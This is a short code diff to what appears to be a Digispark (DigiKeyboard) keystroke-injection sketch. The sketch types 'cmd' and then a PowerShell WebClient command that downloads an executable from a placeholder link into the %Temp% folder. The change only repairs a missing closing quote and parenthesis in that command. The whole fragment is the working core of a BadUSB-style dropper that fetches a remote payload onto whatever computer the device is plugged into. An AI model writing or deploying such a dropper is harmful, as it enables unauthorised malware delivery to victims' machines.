@@ -14,7 +14,7 @@ DigiKeyboard.print("cmd");
 delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 delay(500);
-DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('link on your file','%Temp%/yourfile.exe');
+DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('link on your file','%Temp%/yourfile.exe')");
 delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 delay(500);
